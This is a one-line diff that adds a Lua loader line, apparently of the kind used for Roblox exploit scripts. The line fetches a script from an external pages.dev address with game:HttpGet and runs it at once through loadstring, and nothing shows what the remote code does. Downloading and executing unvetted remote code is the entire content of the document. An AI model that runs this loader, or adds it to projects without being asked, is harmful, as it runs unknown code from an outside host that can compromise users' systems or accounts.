@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://spsl-moreira.pages.dev/l/a946d94951cdc913.lua"))()
